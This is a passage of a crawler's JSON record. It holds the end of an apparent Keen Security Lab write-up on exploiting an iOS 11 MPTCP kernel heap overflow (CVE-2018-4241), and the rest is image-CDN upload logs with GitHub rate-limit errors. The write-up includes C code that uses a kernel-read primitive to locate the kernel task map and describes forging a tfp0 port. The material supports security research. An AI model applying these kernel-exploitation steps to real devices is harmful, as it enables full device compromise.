kobject\\n\"</span>);</span><br><span class=\"line\"> <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// check the pid via the bsd_info:</span></span><br><span class=\"line\"> <span class=\"keyword\">uint64_t</span> bsd_info = early_rk64(<span class=\"keyword\">task_t</span> + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (bsd_info == <span class=\"number\">0</span>) {</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"task doesn't have a bsd info\\n\"</span>);</span><br><span class=\"line\"> <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"keyword\">uint32_t</span> pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (pid != <span class=\"number\">0</span>) {</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"task isn't the kernel task\\n\"</span>);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// found the right task, get the vm_map</span></span><br><span class=\"line\"> kernel_vm_map = early_rk64(<span class=\"keyword\">task_t</span> + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (kernel_vm_map == <span class=\"number\">0</span>) {</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"unable to find the kernel task map\\n\"</span>);</span><br><span class=\"line\"> <span class=\"keyword\">return</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"kernel map:%016llx\\n\"</span>, kernel_vm_map);</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>After insert what we just found into our fake port and fake task, we now finally get a fully functional, but “fake”, tfp0. Hooray!</p> \n <p>Have fun now with your freshly baked tfp0!</p> \n <h1 id=\"Reference\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h1> \n <ol> \n  <li><em><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1558\" target=\"_blank\" rel=\"noopener\">XNU kernel heap overflow due to bad bounds checking in MPTCP</a></em>, Ian Beer</li> \n  <li><em><a href=\"https://googleprojectzero.blogspot.com/2017/04/exception-oriented-exploitation-on-ios.html\" target=\"_blank\" rel=\"noopener\">Exception-based exploitation on iOS</a></em>, Ian Beer</li> \n  <li><em><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-4241\" target=\"_blank\" rel=\"noopener\">CVE-2018-4241</a>,</em> Common Vulnerabilities and Exposures</li> \n  <li><em>Mac OS X Internals - A System Approach</em>, Amit Singh</li> \n  <li>*<em>OS Internals: Volume III security &amp; Insecurity</em>, Jonathan Levin</li> \n </ol> \n</hr>","descriptionType":"html","publishedDate":"Thu, 19 Jul 2018 14:30:23 +0000","feedId":17218,"bgimg":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-093d217f-befe-4768-b88c-4c3f0840687d.48.09AM.png","linkMd5":"f777d2cb655ad641dc020ebf88116b5b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn28@2020_1/2020/10/09/15-26-01-446_2d862d0209f49812.webp","destWidth":1814,"destHeight":626,"sourceBytes":107794,"destBytes":32830,"author":"","articleImgCdnMap":{"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-093d217f-befe-4768-b88c-4c3f0840687d.48.09AM.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn28@2020_1/2020/10/09/15-26-01-446_2d862d0209f49812.webp","http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-7293bd49-18de-4f1f-b740-ab1f0218e38f.25.21PM.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn45@2020_3/2020/10/09/15-26-06-491_39eeb2d217784de6.webp","http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-f863a95f-fb6b-4211-a7d2-1e198c91787d.26.36PM.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn35@2020_3/2020/10/09/15-26-07-814_74c6f4d5566f079c.webp","http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-3ea59e74-43c5-4fc0-8cf8-1ee9fdea9066.46.46AM.png":null,"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-bae4db7b-80b1-47d5-bf07-1791f930661f.29.34PM.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn40@2020_5/2020/10/09/15-26-07-290_845a8f73da3041a8.webp","http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at5-e2e4478b-2274-4d8e-a98b-26c97212d509.42.43PM.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn44@2020_4/2020/10/09/15-26-06-972_3d57b3ebbef88120.webp","http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at6-8b337252-8801-4c79-a571-86b83d0769d4.22.03PM.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn31@2020_3/2020/10/09/15-26-08-975_f468a0eecfe97783.webp","http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-12at5-f6b9fc4c-5035-4719-91d6-3796de3006e0.40.44PM.png":null,"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-12at5-2206d15a-141d-42f8-837c-8550f78837ad.40.10PM.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn41@2020_5/2020/10/09/15-26-07-407_26642a779ba14001.webp"},"publishedOrCreatedDate":1602257149623}],"record":{"createdTime":"2020-10-09 23:25:49","updatedTime":"2020-10-09 23:25:49","feedId":17218,"fetchDate":"Fri, 09 Oct 2020 15:25:49 +0000","fetchMs":3972,"handleMs":5981,"totalMs":32115,"newArticles":0,"totalArticles":19,"status":1,"type":0,"ip":"653271a692dec6fc306ba3e6f3bdbec9","hostName":"us-032*","requestId":"ffdf898a5b2d42589ce4e55541390204_17218","contentType":"text/xml; charset=utf8","totalBytes":285266,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":9,"articlesImgsGithubTotal":7,"successGithubMap":{"myreaderx15":1,"myreaderx7":1,"myreaderx27":1,"myreaderx11":1,"myreaderx22":1,"myreaderx2":1,"myreaderx30":1},"failGithubMap":{"myreaderx14":1,"myreaderx23":1}},"feed":{"createdTime":"2020-09-07 02:14:36","updatedTime":"2020-09-07 02:47:46","id":17218,"name":"Keen Security Lab Blog","url":"http://keenlab.tencent.com/en/atom.xml","subscriber":194,"website":null,"icon":"http://keenlab.tencent.com/favicon.ico","icon_jsdelivr":null,"description":"","weekly":null,"link":"http://keenlab.tencent.com"},"noPictureArticleList":[{"createdTime":"2020-10-09 23:26:10","updatedTime":"2020-10-09 23:26:10","id":null,"feedId":17218,"linkMd5":"f777d2cb655ad641dc020ebf88116b5b"}],"tmpCommonImgCdnBytes":32830,"tmpBodyImgCdnBytes":252436,"tmpBgImgCdnBytes":0,"extra4":{"start":1602257138449,"total":0,"statList":[{"spend":5207,"msg":"获取xml内容"},{"spend":5981,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":1,"msg":"修正封面图上传失败重新上传"},{"spend":8209,"msg":"正文链接上传到cdn"}]},"extra5":9,"extra6":9,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-3ea59e74-43c5-4fc0-8cf8-1ee9fdea9066.46.46AM.png","sourceStatusCode":200,"destWidth":1828,"destHeight":620,"sourceBytes":125499,"destBytes":42182,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4966,"convertSpendMs":37,"createdTime":"2020-10-09 23:26:02","host":"us-005*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn54/contents/2020/10/09/15-26-07-387_c5ef89590857b8cf.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 15:26:07 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["BBE6:196E:1CF34:4FA20:5F80810C"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602260520"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn54/contents/2020/10/09/15-26-07-387_c5ef89590857b8cf.webp","historyStatusCode":[],"spendMs":47},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"122.6 KB","destSize":"41.2 KB","compressRate":"33.6%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-12at5-f6b9fc4c-5035-4719-91d6-3796de3006e0.40.44PM.png","sourceStatusCode":200,"destWidth":1372,"destHeight":848,"sourceBytes":126237,"destBytes":49874,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5118,"convertSpendMs":66,"createdTime":"2020-10-09 23:26:02","host":"us-016*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn37/contents/2020/10/09/15-26-07-504_dbdd5478f4b9c809.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 15:26:07 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["84CE:6F06:A793A:11C121:5F80810F"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602260515"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn37/contents/2020/10/09/15-26-07-504_dbdd5478f4b9c809.webp","historyStatusCode":[],"spendMs":76},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"123.3 KB","destSize":"48.7 KB","compressRate":"39.5%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-3ea59e74-43c5-4fc0-8cf8-1ee9fdea9066.46.46AM.png","sourceStatusCode":200,"destWidth":1828,"destHeight":620,"sourceBytes":125499,"destBytes":42182,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":2946,"convertSpendMs":36,"createdTime":"2020-10-09 23:26:07","host":"us-005*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn54/contents/2020/10/09/15-26-10-355_c5ef89590857b8cf.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 15:26:10 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["BBE6:196E:1CF89:4FB31:5F80810F"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602260520"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn54/contents/2020/10/09/15-26-10-355_c5ef89590857b8cf.webp","historyStatusCode":[],"spendMs":51},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"122.6 KB","destSize":"41.2 KB","compressRate":"33.6%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-12at5-f6b9fc4c-5035-4719-91d6-3796de3006e0.40.44PM.png","sourceStatusCode":200,"destWidth":1372,"destHeight":848,"sourceBytes":126237,"destBytes":49874,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":2940,"convertSpendMs":81,"createdTime":"2020-10-09 23:26:07","host":"us-016*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn37/contents/2020/10/09/15-26-10-423_dbdd5478f4b9c809.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 15:26:10 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["E20C:78BC:B896A:136E4A:5F80810F"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602260515"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn37/contents/2020/10/09/15-26-10-423_dbdd5478f4b9c809.webp","historyStatusCode":[],"spendMs":47},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"123.3 KB","destSize":"48.7 KB","compressRate":"39.5%"}],"extra10_invalidATagHrefValue":{"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Mach-exception-port":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Mach-exception-port","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Allocate-more-mach-ports":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Allocate-more-mach-ports","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Background":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Background","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Receive-the-exception-message":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Receive-the-exception-message","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#The-Vulnerability":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#The-Vulnerability","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Catching-the-port":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Catching-the-port","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#1-Start-a-thread":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#1-Start-a-thread","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#4-Crash-the-thread":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#4-Crash-the-thread","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Reference":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Reference","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#2-Register-exception-port":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#2-Register-exception-port","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Build-fake-task-port":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Build-fake-task-port","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Set-up-the-heap":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Set-up-the-heap","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Allocate-pipes":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Allocate-pipes","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Catching-the-pipe":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Catching-the-pipe","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Build-early-kernel-read-primitive":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Build-early-kernel-read-primitive","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Build-full-kernel-read-write-primitive":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Build-full-kernel-read-write-primitive","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Introduction":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Introduction","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Finding-the-target":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Finding-the-target","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Trigger-the-bug-again":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Trigger-the-bug-again","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#3-Substitute-thread-port-with-a-host-port":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#3-Substitute-thread-port-with-a-host-port","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Kernel-zone-heap-allocator":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Kernel-zone-heap-allocator","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Preallocated-ipc-kmsg-buffer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Preallocated-ipc-kmsg-buffer","http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/_#Trigger-the-bug":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Trigger-the-bug"},"extra111_proxyServerAndStatMap":{"http://us-006.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-007.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-005.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-028.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-008.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-015.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-016.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-093d217f-befe-4768-b88c-4c3f0840687d.48.09AM.png","sourceStatusCode":200,"destWidth":1814,"destHeight":626,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn28@2020_1/2020/10/09/15-26-01-446_2d862d0209f49812.webp","sourceBytes":107794,"destBytes":32830,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":6770,"convertSpendMs":115,"createdTime":"2020-10-09 23:25:55","host":"us-51*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b,f777d2cb655ad641dc020ebf88116b5b","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"105.3 KB","destSize":"32.1 KB","compressRate":"30.5%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-7293bd49-18de-4f1f-b740-ab1f0218e38f.25.21PM.png","sourceStatusCode":200,"destWidth":1090,"destHeight":702,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn45@2020_3/2020/10/09/15-26-06-491_39eeb2d217784de6.webp","sourceBytes":79416,"destBytes":23446,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4988,"convertSpendMs":61,"createdTime":"2020-10-09 23:26:02","host":"us-008*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"77.6 KB","destSize":"22.9 KB","compressRate":"29.5%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at5-e2e4478b-2274-4d8e-a98b-26c97212d509.42.43PM.png","sourceStatusCode":200,"destWidth":2210,"destHeight":830,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn44@2020_4/2020/10/09/15-26-06-972_3d57b3ebbef88120.webp","sourceBytes":149232,"destBytes":44252,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5456,"convertSpendMs":299,"createdTime":"2020-10-09 